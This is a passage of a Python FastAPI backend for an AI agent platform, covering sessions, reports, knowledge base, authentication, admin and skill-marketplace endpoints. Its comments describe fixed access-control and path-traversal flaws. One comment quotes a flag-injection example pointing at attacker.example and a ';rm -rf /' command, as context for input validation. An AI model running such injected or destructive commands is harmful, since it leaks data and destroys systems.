    "tavily": ("tavily_key", "tavily_key_enc"),
}


@router.get("/v1/setup/search-key")
async def get_search_key_status():
    """已配置与否。绝不返回 key 的任何片段。"""
    from agent_harness.core.config import get_search_config

    got = get_search_config()
    return {
        "deepseek": {"configured": bool(got.get("deepseek_key"))},
        "tavily": {"configured": bool(got.get("tavily_key"))},
    }


@router.post("/v1/setup/search-key")
async def save_search_key(request: Request):
    """保存/清除用户自己的搜索 key。

    body: {"provider": "deepseek"|"tavily", "key": "<明文>"}；key 为空串 = 清除。
    """
    if _capability_denied("write_server_config"):
        return JSONResponse({"error": "演示模式禁止写入服务器密钥"}, status_code=403)

    body = await request.json()
    provider = str((body or {}).get("provider") or "").strip().lower()
    key = str((body or {}).get("key") or "").strip()
    if provider not in _SEARCH_KEY_FIELDS:
        return JSONResponse({"error": "provider 只支持 deepseek / tavily"}, status_code=400)
    if key and len(key) < 8:
        return JSONResponse({"error": "key 太短（<8 字符），请检查是否粘贴完整"}, status_code=400)
    if key and any(c.isspace() for c in key):
        return JSONResponse({"error": "key 含空格/换行，请检查粘贴内容"}, status_code=400)

    from agent_harness.core.pipeline.config_manager import CONFIG_PATH, load_config
    from agent_harness.core.pipeline.keystore import encrypt_key

    cfg = load_config() or {}
    search = cfg.setdefault("search", {})
    plain_field, enc_field = _SEARCH_KEY_FIELDS[provider]
    # 明文残留一律抹掉（历史配置里可能存过明文）
    search.pop(plain_field, None)
    if key:
        try:
            search[enc_field] = encrypt_key(key)
        except Exception as e:  # noqa: BLE001 —— 加密不可用就别假装存上了
            return JSONResponse({"error": f"密钥加密失败，未保存：{type(e).__name__}"}, status_code=500)
    else:
        search.pop(enc_field, None)

    # 落盘：保留其它段，只替换 search
    import json as _j

    existing = {}
    if CONFIG_PATH.exists():
        try:
            with open(CONFIG_PATH, encoding="utf-8") as f:
                existing = _j.load(f) or {}
        except (_j.JSONDecodeError, OSError):
            existing = {}
    existing["search"] = search
    CONFIG_PATH.parent.mkdir(parents=True, exist_ok=True)
    tmp = CONFIG_PATH.with_suffix(".json.tmp")
    tmp.write_text(_j.dumps(existing, ensure_ascii=False, indent=2), encoding="utf-8")
    tmp.replace(CONFIG_PATH)

    return {"ok": True, "provider": provider, "configured": bool(key)}


@router.get("/v1/setup/llm-backends")
async def llm_backends():
    return _get_cm().check_llm_backend()


@router.get("/v1/setup/env-check")
async def env_check():
    return _get_cm().full_env_check()


@router.post("/v1/setup/test-llm")
async def test_llm(request: Request):
    body = await request.json()
    return _get_cm().test_llm_connection(
        endpoint=body.get("endpoint", ""),
        model=body.get("model", ""),
        api_key=body.get("api_key", ""),
    )


@router.post("/v1/setup/fix")
async def run_fix(request: Request):
    body = await request.json()
    action = body.get("action", "")
    result = _get_cm().fix_action(action)
    return result


@router.post("/v1/setup/auto-configure")
async def auto_configure():
    # 同 `/v1/setup/config`：这条也会 `save_config`（auto_setup.py:160），
    # 是"访客改服务器配置"的第二条写路径 —— demo 下必须同样 fail-closed。
    if _capability_denied("write_server_config"):
        return JSONResponse({"error": "演示模式禁止修改服务器配置"}, status_code=403)
    result = _get_cm().fix_action("auto_configure")
    return result


# ─── Tools API ───

@router.get("/v1/tools")
async def list_tools():
    try:
        from agent_harness.core.tools.registry import TOOL_REGISTRY
        tools = {
            k: {
                "description": v["schema"].get("description", ""),
                "privilege": v.get("privilege", "read-only"),
                "category": v.get("category", ""),
                "properties": list(v["schema"].get("properties", {}).keys()),
                "enabled": is_tool_enabled(k),
            }
            for k, v in TOOL_REGISTRY.items()
        }
        return {"tools": tools, "count": len(tools)}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


# ─── Path traversal sanitizer ───

# 白名单：路径参数只允许 Unicode 词字符（字母/数字/下划线，含中日韩）+ 连字符。
# 关键：不能用 ASCII 白名单 —— `_slugify` 用的是 `\w`（Unicode），中文标题会留在
# 真实 id 里（例：`formal_1783488609_智能手表竞品分析报告`），ASCII 白名单会把每份
# 中文标题报告打成 400。`[\w-]` 天然排除 `* ? [ ] / \ .` 等 glob/路径元字符（黑名单
# 只挡 `..` 与斜杠，实测 `*` `?` `[` 全放行 → 前缀通配可读他人报告 + 命中目录后 500）。
_PATH_PARAM_RE = re.compile(r"^[\w-]{1,128}$", re.UNICODE)


def _safe_path_param(value: str) -> str:
    v = (value or "").strip()
    if not _PATH_PARAM_RE.match(v):
        raise ValueError("Invalid path parameter: only [A-Za-z0-9_-]{1,128} allowed")
    return v


# ─── Report API ───

def _get_rs():
    from agent_harness.apps.research.pipeline import report_store
    return report_store


@router.post("/v1/reports")
async def create_report(request: Request):
    owner_id = getattr(request.state, "user", {}).get("id", "")
    body = await request.json()
    meta = _get_rs().save_report(
        title=body.get("title", "未命名报告"),
        content=body.get("content", ""),
        tags=body.get("tags", []),
        source_session=body.get("source_session", ""),
        owner_id=owner_id,
    )
    return meta


@router.get("/v1/reports")
async def list_reports(request: Request,
                       limit: int = Query(50, ge=1, le=500),
                       offset: int = Query(0, ge=0),
                       q: str = ""):
    """集合读取 + 搜索（REST 集合过滤）：唯一读路径 = store.list_reports(q=...)。"""
    user = getattr(request.state, "user", None)
    is_admin = bool(user and user.get("role") == "admin")
    owner_filter = None if is_admin else ((user or {}).get("id", ""))
    reports = _get_rs().list_reports(
        limit=limit, offset=offset, owner_id=owner_filter, q=q or None,
    )
    return {"reports": reports, "count": len(reports)}


@router.get("/v1/reports/{report_id}")
async def get_report(report_id: str, request: Request):
    """单份报告：所有权由 store 强制（owner_id 必传）。

    旧实现不接 request、拿不到身份，且用 `_RD.glob(f"{report_id}*")` 前缀多匹配
    直接读文件系统 → 非 owner 可读任意报告（前缀通配即可 dump）。现一律经
    store.get_report(owner_id=...)，非 owner 与不存在都回 404（不泄露存在性）。
    """
    try:
        report_id = _safe_path_param(report_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    user = getattr(request.state, "user", None)
    is_admin = bool(user and user.get("role") == "admin")
    owner_filter = None if is_admin else ((user or {}).get("id", ""))
    data = _get_rs().get_report(report_id, owner_id=owner_filter)
    if data is None:
        return JSONResponse({"error": "Report not found"}, status_code=404)
    content = data.get("content", "")
    if data.get("format") == "html" or str(data.get("filename", "")).endswith(".html"):
        return HTMLResponse(content)
    return {"id": data.get("id", report_id), "content": content, "format": "md",
            "title": data.get("title", ""), "created_at": data.get("created_at")}


@router.delete("/v1/reports/{report_id}")
async def delete_report(report_id: str, request: Request):
    try:
        report_id = _safe_path_param(report_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    user = getattr(request.state, "user", None)
    is_admin = bool(user and user.get("role") == "admin")
    owner_filter = None if is_admin else ((user or {}).get("id", ""))
    if _get_rs().delete_report(report_id, owner_id=owner_filter):
        return {"status": "deleted"}
    # 非 owner 与不存在同回 404：删除不得成为存在性 oracle
    return JSONResponse({"error": "Report not found"}, status_code=404)


@router.post("/v1/reports/formalize")
async def formalize_report(request: Request):
    owner_id = getattr(request.state, "user", {}).get("id", "")
    body = await request.json()
    title = body.get("title", "调研报告")
    content = body.get("content", "")
    tags = body.get("tags", [])
    source_session = body.get("source_session", "")
    sources = body.get("sources", [])
    provenance = body.get("provenance")
    factcheck = body.get("factcheck")

    # ENG-29 完整闭环：调用方没显式传证据 → 从来源会话取（证据链已随 assistant 消息落盘）。
    # 此前这里只能靠调用方传，agent 侧不传 → 正式报告永远没有「事实核验说明」汇总块。
    if source_session and not provenance:
        _role = getattr(request.state, "user", {}).get("role", "")
        provenance, _sess_fc, _err = _evidence_from_session(source_session, owner_id, _role)
        if _err is not None:
            return _err
        factcheck = factcheck or _sess_fc
        if provenance and not sources:
            sources = _sources_from_provenance(provenance)

    from agent_harness.apps.research.pipeline import report_formatter
    html = report_formatter.generate_report_html(
        title, content, sources=sources,
        provenance=provenance or None,
        factcheck=factcheck or None,
    )
    meta = report_formatter.save_formal_report(
        title=title,
        html=html,
        tags=tags,
        source_session=source_session,
        owner_id=owner_id,
    )
    return {**meta, "html": html[:500] + "..."}


# ─── Audit Logs API ───


@router.get("/v1/audit/logs")
async def get_audit_logs(
    request: Request,
    action: str = "",
    limit: int = Query(50, ge=1, le=500),
):
    """查询审计日志 —— **仅管理员**。

    审计行含 `params` / `result`（每次工具调用的**实参与输出**：用户 prompt、被执行的代码、
    文件路径、查询串…），而 `audit_log` 表**没有 owner 列**，做不到"只看自己的" →
    多用户部署下，任何已登录用户都能读到别人的工具调用明细（跨用户信息泄漏）。
    故这里只有 admin 能读；前端目前不调用本端点（grep 零命中），加闸零 UI 回归。
    """
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    from agent_harness.core.audit import query_audit
    logs = query_audit(action=action, limit=limit)
    return {"logs": logs, "count": len(logs)}


# ─── Safety API (权限双层架构) ───


@router.get("/v1/safety/mode")
async def get_safety_mode(request: Request):
    """查询当前安全模式 + 待确认操作列表"""
    from agent_harness.core.safety import get_mode, pending_operations
    user = getattr(request.state, "user", None) or {}
    return {
        "mode": get_mode(),
        "pending": pending_operations(limit=10),
        "operator": user.get("username", "unknown"),
    }


@router.post("/v1/safety/mode")
async def set_safety_mode(request: Request):
    """切换安全模式: {"mode": "default" | "full"}"""
    body = await request.json()
    mode = (body or {}).get("mode", "")
    from agent_harness.core.safety import set_mode
    user = getattr(request.state, "user", None) or {}
    result = set_mode(mode, source="api", operator=user.get("username", "unknown"))
    if not result.get("ok"):
        return JSONResponse({"error": result["error"]}, status_code=400)
    return result


@router.post("/v1/safety/confirm")
async def confirm_safety_operation(request: Request):
    """确认一次被护栏拦截的操作: {"code": "ab12cd34"}"""
    body = await request.json()
    code = (body or {}).get("code", "")
    if not code:
        return JSONResponse({"error": "缺少确认码 code"}, status_code=400)
    from agent_harness.core.safety import confirm_operation
    user = getattr(request.state, "user", None) or {}
    result = confirm_operation(code, operator=user.get("username", "unknown"))
    if not result.get("ok"):
        return JSONResponse({"error": result["error"]}, status_code=404)
    return result


# ─── Sessions API ───

@router.get("/v1/sessions")
async def list_sessions(request: Request):
    user = getattr(request.state, "user", None)
    is_admin = user and user.get("role") == "admin"
    owner_filter = None if is_admin else (user.get("id", "") if user else "")
    sessions = _list_sessions(owner_id=owner_filter)
    return {"sessions": sessions, "count": len(sessions)}


@router.delete("/v1/sessions/{session_id}")
async def delete_session_endpoint(session_id: str, request: Request):
    try:
        _safe_path_param(session_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    if _session_access_denied(request, session_id):
        return JSONResponse({"error": "Session not found"}, status_code=404)
    if _delete_session(session_id):
        return {"status": "deleted", "session_id": session_id}
    return JSONResponse({"error": f"Session not found: {session_id}"}, status_code=404)


@router.get("/v1/sessions/{session_id}/messages")
async def get_session_messages(request: Request, session_id: str):
    try:
        _safe_path_param(session_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    if _session_access_denied(request, session_id):
        return JSONResponse({"error": "Session not found"}, status_code=404)
    msgs = _load_session(session_id)
    if msgs is None:
        return JSONResponse({"error": "Session not found"}, status_code=404)
    return {"messages": msgs, "count": len(msgs)}


@router.post("/v1/sessions/{session_id}/meta")
async def update_session_meta_endpoint(session_id: str, request: Request):
    try:
        _safe_path_param(session_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    if _session_access_denied(request, session_id):
        return JSONResponse({"error": "Session not found"}, status_code=404)
    body = await request.json()
    kwargs = {}
    if "title" in body:
        kwargs["title"] = str(body["title"])[:100]
    if "pinned" in body:
        kwargs["pinned"] = bool(body["pinned"])
    if not kwargs:
        return JSONResponse({"error": "没有可更新的字段"}, status_code=400)
    from agent_harness.core.pipeline.session_store import update_session_meta
    result = update_session_meta(session_id, **kwargs)
    if result is None:
        return JSONResponse({"error": "会话不存在"}, status_code=404)
    return {"status": "updated", "session": result}


@router.get("/v1/sessions/{session_id}/export")
async def export_single_session(request: Request, session_id: str):
    try:
        _safe_path_param(session_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    if _session_access_denied(request, session_id):
        return JSONResponse({"error": "Session not found"}, status_code=404)
    msgs = _load_session(session_id) or []
    data = {"session_id": session_id, "messages": msgs, "exported_at": int(time.time())}
    return StreamingResponse(
        iter([json.dumps(data, ensure_ascii=False, indent=2)]),
        media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename=session_{session_id[:12]}.json"},
    )


@router.get("/v1/search/messages")
async def search_messages(request: Request, q: str = ""):
    user = getattr(request.state, "user", None)
    is_admin = user and user.get("role") == "admin"
    owner_filter = None if is_admin else (user.get("id", "") if user else "")
    if not q:
        return {"results": [], "count": 0}
    from agent_harness.core.pipeline.session_store import search_messages as _search_msgs
    results = _search_msgs(q, owner_id=owner_filter, limit=20)
    return {"results": results, "count": len(results)}


def _session_access_denied(request: Request, session_id: str) -> bool:
    """单条会话的 owner 校验：非 owner 与"不存在"同回 404（不得成为存在性 oracle）。

    admin 不受限；legacy 无 owner 的会话对非 admin 不可见（与 reports 同一策略）。
    """
    user = getattr(request.state, "user", None) or {}
    if user.get("role") == "admin":
        return False
    from agent_harness.core.pipeline.session_store import get_session_summary
    meta = get_session_summary(session_id) or {}
    owner = meta.get("owner_id", "")
    return not (owner and owner == user.get("id", ""))


# ─── Agent Log API ───

@router.get("/v1/sessions/{session_id}/logs")
async def get_session_logs(request: Request, session_id: str):
    try:
        _safe_path_param(session_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    if _session_access_denied(request, session_id):
        return JSONResponse({"error": "Session not found"}, status_code=404)
    logs = _get_logs(session_id)
    return {"logs": logs, "count": len(logs)}


@router.delete("/v1/sessions/{session_id}/logs")
async def clear_session_logs(request: Request, session_id: str):
    try:
        _safe_path_param(session_id)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    if _session_access_denied(request, session_id):
        return JSONResponse({"error": "Session not found"}, status_code=404)
    if _clear_logs(session_id):
        return {"status": "cleared"}
    return {"status": "not_found"}


# ─── Task Cancel API ───

@router.get("/v1/tasks")
async def list_running_tasks():
    with _running_tasks_lock:
        tasks = [
            {
                "session_id": sid,
                "running": not event.is_set(),
            }
            for sid, event in _running_tasks.items()
        ]
    return {"tasks": tasks, "count": len(tasks)}


@router.post("/v1/tasks/{session_id}/cancel")
async def cancel_task(session_id: str):
    # 只 set 这个 session 自己的信号（ENG-21）——不能碰全局兜底事件，否则会错杀别的会话
    if not _cancel_task(session_id):
        return JSONResponse(
            {"error": f"No running task for session: {session_id}"},
            status_code=404,
        )
    return {"status": "cancelled", "session_id": session_id}


# ─── Knowledge Base API ───
#
# SEC-16：collection 是物理目录名（RAG_DIR/<collection>），此前四个端点全无 owner 概念
# → 任意登录用户可列出/查询/上传/删除任意 collection（越权读 + 越权删库）。
# 修法：API 层把普通用户的 collection 名加上 `user_<uid>_` 前缀，admin 直通原名
# （运维视图；demo 模式注入的 guest 也是 admin 角色）。物理层不动，避免迁移。

def _user_collection(request: Request, collection: str) -> str:
    """把用户给的 collection 名映射为物理目录名。admin → 原名；普通用户 → user_<uid>_<name>。"""
    user = getattr(request.state, "user", None) or {}
    if user.get("role") == "admin":
        return collection
    return f"user_{user.get('id') or 'guest'}_{collection}"


def _kb_scope_prefix(request: Request | None) -> str:
    """当前请求可见的 collection 前缀。admin/None → ""（全见）。"""
    if request is None:
        return ""
    user = getattr(request.state, "user", None) or {}
    if user.get("role") == "admin" or not user:
        return ""
    return f"user_{user.get('id') or 'guest'}_"


def _strip_kb_prefix(request: Request, name: str) -> str:
    """物理目录名 → 展示名（只剥当前用户自己的前缀，不泄露别人的 uid）。"""
    prefix = _kb_scope_prefix(request)
    return name[len(prefix):] if prefix and name.startswith(prefix) else name


@router.get("/v1/knowledge/collections")
async def kb_list_collections(request: Request):
    try:
        from agent_harness.core.tools.rag_store import collection_info, list_collections
        prefix = _kb_scope_prefix(request)
        cols = [c for c in list_collections() if not prefix or c.startswith(prefix)]
        items = []
        for c in cols:
            info = collection_info(c)
            info["name"] = _strip_kb_prefix(request, c)   # 展示名
            info["physical_name"] = c
            items.append(info)
        return {"collections": items, "count": len(items)}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@router.post("/v1/knowledge/upload")
async def kb_upload_file(request: Request):
    try:
        from agent_harness.core.tools.rag_store import collection_info, index_file
    except Exception as e:
        return JSONResponse({"error": f"RAG store not available: {e}"}, status_code=500)
    import tempfile
    try:
        form = await request.form()
        upload = form.get("file")
        if not upload:
            return JSONResponse({"error": "No file provided"}, status_code=400)
        collection = _user_collection(request, form.get("collection", "default"))
        filename = upload.filename or "unknown"
        content = await upload.read()
        suffix = Path(filename).suffix or ".tmp"
        with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
            tmp.write(content)
            tmp_path = tmp.name
        try:
            result = index_file(tmp_path, collection=collection, filename=filename)
            info = collection_info(collection)
            resp = {
                "status": "ok",
                "filename": filename,
                "collection": _strip_kb_prefix(request, collection),
                "chunks_indexed": result.get("chunks_count", 0),
                "embedding_status": result.get("embedding_status", "unknown"),
                "fallback": result.get("fallback", "none"),
                "collection_info": info,
            }
            if result.get("embedding_status") == "offline":
                resp["warning"] = "嵌入服务离线，已使用 BM25 关键词搜索作为降级方案"
            return resp
        finally:
            os.unlink(tmp_path)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@router.delete("/v1/knowledge/collections/{name}")
async def kb_delete_collection(name: str, request: Request):
    try:
        from agent_harness.core.tools.rag_store import delete_collection
    except Exception as e:
        return JSONResponse({"error": f"RAG store not available: {e}"}, status_code=500)
    # SEC-16：普通用户只能删自己前缀下的 collection；传入别人的物理名会再套一层前缀 → 404
    if delete_collection(_user_collection(request, name)):
        return {"status": "deleted", "collection": name}
    return JSONResponse({"error": f"Collection not found: {name}"}, status_code=404)


@router.get("/v1/knowledge/query")
async def kb_query(request: Request, q: str = "", collection: str = "default", top_k: int = 5):
    try:
        from agent_harness.core.tools.rag_store import query as rag_query
    except Exception as e:
        return JSONResponse({"error": f"RAG store not available: {e}"}, status_code=500)
    if not q:
        return {"results": []}
    try:
        results = rag_query(q, collection=_user_collection(request, collection), top_k=top_k)
        return {"results": results, "count": len(results)}
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


# ─── Auth API ───

# 路由注册在文件末尾按 _MP_LOGIN_ENABLED 条件执行（默认关 → 端点不存在 → 404）。
async def mp_login(request: Request):
    """Mini Program auto-login. Creates user on first visit.

    Body: {"device_id": "uuid-from-miniprogram", "code": "wx.login-code"} (code currently unused)
    Returns: {"token": "jwt...", "user_id": "...", "is_new": true/false}
    """
    body = await request.json()
    device_id = (body.get("device_id", "") or "").strip()
    if not device_id:
        return JSONResponse({"error": "device_id required"}, status_code=400)
    if len(device_id) < 2 or len(device_id) > 48 or any(
        not (c.isalnum() or c == "_") for c in device_id
    ):
        return JSONResponse(
            {"error": "device_id 只能包含字母、数字和下划线，长度 2-48"},
            status_code=400,
        )

    # P0 修复——命名空间隔离：设备账号一律存/查在 DEVICE_USERNAME_PREFIX 前缀下。
    # 旧实现直接按裸 device_id 查 users 表，device_id 命中已存在密码账号(如 admin)时
    # 无条件按该用户自己的 role 铸 token = 凭一个可枚举字符串免密登录任意账号。
    mp_username = _auth_db.DEVICE_USERNAME_PREFIX + device_id
    user = _auth_db.get_user_by_username(mp_username)
    is_new = False
    if not user:
        try:
            _auth_db.create_user(
                mp_username, secrets.token_hex(16),
                role="user", display_name=device_id[:12], is_device=True,
            )
        except ValueError:
            # 并发首次登录竞态：另一请求刚建好，重读复用
            user = _auth_db.get_user_by_username(mp_username)
        else:
            user = _auth_db.get_user_by_username(mp_username)
            is_new = True

    # 纵深防御：设备命名空间内不允许 admin；异常/被篡改数据一律拒发 token
    if user is None or user.get("role") != "user":
        return JSONResponse({"error": "设备登录不可用"}, status_code=403)

    access_token = _auth_jwt.create_access_token(user["id"], device_id[:8], user["role"])
    refresh_token = _auth_jwt.create_refresh_token(user["id"], device_id[:8], user["role"])

    import time as _t
    _auth_db.save_session(_auth_jwt.verify_token(access_token)["jti"], user["id"], int(_t.time()) + 8 * 3600)
    _auth_db.save_session(_auth_jwt.verify_token(refresh_token, expected_type="refresh")["jti"], user["id"], int(_t.time()) + 30 * 86400, token_type="refresh")

    return {
        "token": access_token,
        "refresh_token": refresh_token,
        "user_id": user["id"],
        "is_new": is_new,
        "username": device_id[:8],
    }


if _MP_LOGIN_ENABLED:  # 默认关：未部署的半成品端点是纯粹攻击面
    router.add_api_route("/v1/auth/mp-login", mp_login, methods=["POST"])


@router.get("/v1/auth/login")
async def login_form():
    return JSONResponse({"error": "使用 POST /v1/auth/login 并传入 JSON body ({\"username\": \"...\", \"password\": \"...\"})"}, status_code=405)


@router.post("/v1/auth/login")
async def login(request: Request):
    body = await request.json()
    username = (body.get("username", "") or "").strip()
    password = body.get("password", "") or ""
    if not username or not password:
        return JSONResponse({"error": "请输入用户名和密码"}, status_code=400)
    user = _auth_db.authenticate_user(username, password)
    if user is None:
        return JSONResponse({"error": "用户名或密码错误"}, status_code=401)
    access_token = _auth_jwt.create_access_token(user["id"], user["username"], user["role"])
    refresh_token = _auth_jwt.create_refresh_token(user["id"], user["username"], user["role"])
    import time as _t
    _auth_db.save_session(_auth_jwt.verify_token(access_token)["jti"], user["id"], int(_t.time()) + 8 * 3600)
    _auth_db.save_session(_auth_jwt.verify_token(refresh_token, expected_type="refresh")["jti"], user["id"], int(_t.time()) + 30 * 86400, token_type="refresh")
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "token_type": "Bearer",
        "user": {
            "id": user["id"],
            "username": user["username"],
            "role": user["role"],
            "display_name": user["display_name"],
        },
    }


@router.post("/v1/auth/logout")
async def logout(request: Request):
    auth = request.headers.get("authorization", "")
    if auth.startswith("Bearer "):
        jwt_token = auth[7:]
        payload = _auth_jwt.verify_token(jwt_token)
        if payload and payload.get("jti"):
            _auth_db.revoke_session(payload["jti"])
    return {"status": "logged_out"}


@router.get("/v1/auth/me")
async def get_current_user(request: Request):
    user = getattr(request.state, "user", None)
    if user is None:
        return JSONResponse({"error": "未认证"}, status_code=401)
    return {"user": user, "authenticated": True}


@router.post("/v1/auth/refresh")
async def refresh_token(request: Request):
    body = await request.json()
    refresh_token_str = body.get("refresh_token", "")
    payload = _auth_jwt.verify_token(refresh_token_str, expected_type="refresh")
    if payload is None:
        return JSONResponse({"error": "Refresh token 无效或已过期"}, status_code=401)
    session = _auth_db.is_session_valid(payload["jti"])
    if session is None:
        return JSONResponse({"error": "Refresh token 已被撤销"}, status_code=401)
    new_access = _auth_jwt.create_access_token(payload["sub"], payload["username"], payload["role"])
    new_payload = _auth_jwt.verify_token(new_access)
    if new_payload:
        import time as _t
        _auth_db.save_session(new_payload["jti"], payload["sub"], int(_t.time()) + 8 * 3600)
    return {"access_token": new_access, "token_type": "Bearer"}


@router.post("/v1/auth/setup-admin")
async def setup_initial_admin(request: Request):
    if not _auth_db.needs_initial_admin():
        return JSONResponse({"error": "管理员已存在，不能重复创建"}, status_code=400)
    body = await request.json()
    username = (body.get("username", "") or "").strip()
    password = body.get("password", "") or ""
    if not username or len(username) < 2:
        return JSONResponse({"error": "用户名至少 2 个字符"}, status_code=400)
    if len(password) < 6:
        return JSONResponse({"error": "密码至少 6 位"}, status_code=400)
    try:
        user = _auth_db.create_user(username, password, role="admin", display_name=username)
        return {"status": "created", "user": user, "message": "管理员账号已创建，请登录"}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)


# ─── API Token Management ───

@router.get("/v1/auth/token")
async def get_api_token(request: Request):
    return {"token": "******", "hint": "Token 不会通过 API 返回。服务端内部令牌，仅供已授权的服务端客户端使用。"}


@router.post("/v1/auth/reset")
async def regenerate_api_token(request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    global _API_TOKEN
    _API_TOKEN = _reset_token()
    return {"status": "regenerated", "warning": "所有使用旧 token 的客户端需要更新"}


# ─── Admin API ───

@router.get("/v1/admin/users")
async def admin_list_users(request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    users = _auth_db.list_users()
    return {"users": users, "count": len(users)}


@router.post("/v1/admin/users")
async def admin_create_user(request: Request):
    if _capability_denied("create_account"):
        return JSONResponse({"error": "演示模式禁止创建账号"}, status_code=403)
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    body = await request.json()
    username = (body.get("username", "") or "").strip()
    password = body.get("password", "") or ""
    role = (body.get("role", "user") or "").strip()
    try:
        new_user = _auth_db.create_user(username, password, role=role)
        return {"status": "created", "user": new_user}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@router.post("/v1/admin/users/{user_id}/role")
async def admin_update_user_role(user_id: str, request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    body = await request.json()
    new_role = (body.get("role", "") or "").strip()
    if _auth_db.update_user_role(user_id, new_role):
        _auth_db.revoke_all_user_sessions(user_id)
        return {"status": "updated", "user_id": user_id, "role": new_role}
    return JSONResponse({"error": "用户不存在或角色无效"}, status_code=404)


@router.post("/v1/admin/users/{user_id}/reset-password")
async def admin_reset_password(user_id: str, request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    body = await request.json()
    new_password = body.get("password", "") or ""
    if _auth_db.update_user_password(user_id, new_password):
        _auth_db.revoke_all_user_sessions(user_id)
        return {"status": "password_updated", "user_id": user_id}
    return JSONResponse({"error": "密码更新失败（至少 6 位）"}, status_code=400)


@router.delete("/v1/admin/users/{user_id}")
async def admin_delete_user(user_id: str, request: Request):
    user = getattr(request.state, "user", None)
    if not user or user.get("role") != "admin":
        return JSONResponse({"error": "需要管理员权限"}, status_code=403)
    if user_id == user.get("id"):
        return JSONResponse({"error": "不能删除自己"}, status_code=400)
    if _auth_db.delete_user(user_id):
        return {"status": "deleted", "user_id": user_id}
    return JSONResponse({"error": "用户不存在"}, status_code=404)


# ─── Skills Management API ───

# 灵枢自有技能目录（core.config.SKILLS_DIR，可用 HARNESS_SKILLS_DIR 覆盖）。
# 历史实现硬编码外部产品的数据目录 = 把灵枢当外部产品的下游（ADR-001 记录的耦合污点），已解耦。
_SKILLS_DIR = _LINGSHU_SKILLS_DIR


def _scan_skills() -> list[dict]:
    skills = []
    if not _SKILLS_DIR.exists():
        return skills
    for d in sorted(_SKILLS_DIR.iterdir()):
        if d.is_dir() and not d.name.startswith("_") and not d.name.startswith("."):
            skills.append({"name": d.name, "enabled": True, "builtin": False})
    disabled_dir = _SKILLS_DIR / "_disabled"
    if disabled_dir.exists():
        for d in sorted(disabled_dir.iterdir()):
            if d.is_dir() and not d.name.startswith("."):
                skills.append({"name": d.name, "enabled": False, "builtin": False})
    return skills


@router.get("/v1/skills")
async def list_skills():
    return {"skills": _scan_skills(), "count": len(_scan_skills())}


@router.post("/v1/skills/{name}/toggle")
async def toggle_skill(request: Request, name: str):
    if _capability_denied("write_host_state"):
        return JSONResponse({"error": "演示模式禁止修改宿主技能库"}, status_code=403)
    enabled_dir = _SKILLS_DIR / name
    disabled_dir = _SKILLS_DIR / "_disabled" / name
    if enabled_dir.exists():
        target = _SKILLS_DIR / "_disabled"
        target.mkdir(exist_ok=True)
        enabled_dir.rename(disabled_dir)
        return {"name": name, "enabled": False}
    elif disabled_dir.exists():
        disabled_dir.rename(enabled_dir)
        return {"name": name, "enabled": True}
    return JSONResponse({"error": f"技能不存在: {name}"}, status_code=404)


@router.get("/v1/skills/marketplace")
async def marketplace_search(q: str = ""):
    # 能力闸：与 marketplace_install 同形 —— 搜索同样要起外部进程（skillhub）
    if _capability_denied("run_external_process"):
        return JSONResponse({"error": "演示模式禁止调用第三方技能市场"}, status_code=403)
    q = (q or "").strip()
    # 参数注入防护：q 直通外部程序 → flag 注入。`?q=--search-url=http://attacker.example/api`
    # 会让**部署主机替访客出网**（SSRF / 查询内容外带），`;rm -rf /` 之类更是直给。
    if q and (q.startswith("-") or not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}", q)):
        return JSONResponse(
            {"error": "查询非法（只允许字母数字与 . _ -，且不得以 - 开头）"}, status_code=400)
    import shutil, subprocess
    skillhub = shutil.which("skillhub") or os.path.expanduser("~/.local/bin/skillhub")
    if not os.path.isfile(skillhub):
        return {"skills": [], "error": "SkillHub not installed"}
    try:
        # `--` 明确结束选项解析：即使上游校验被绕过，q 也不会再被当作 flag
        r = subprocess.run([skillhub, "search", "--", q], capture_output=True, text=True, timeout=15)
        lines = [line.strip() for line in r.stdout.split("\n") if line.strip() and not line.startswith("NAME")]
        skills = []
        for line in lines[:50]:
            parts = line.split(None, 2)
            if len(parts) >= 2:
                skills.append({"name": parts[0], "desc": parts[1] if len(parts) > 1 else "", "installed": False})
        installed = {s["name"] for s in _scan_skills()}
        for s in skills:
            if s["name"] in installed:
                s["installed"] = True
        return {"skills": skills, "count": len(skills)}
    except Exception as e:
        return {"skills": [], "error": str(e)}


@router.post("/v1/skills/marketplace/install")
async def marketplace_install(request: Request):
    body = await request.json()
    if _capability_denied("run_external_process"):
        return JSONResponse({"error": "演示模式禁止安装第三方技能"}, status_code=403)
    slug = (body.get("slug", "") or "").strip()
    if not slug:
        return JSONResponse({"error": "缺少 slug 参数"}, status_code=400)
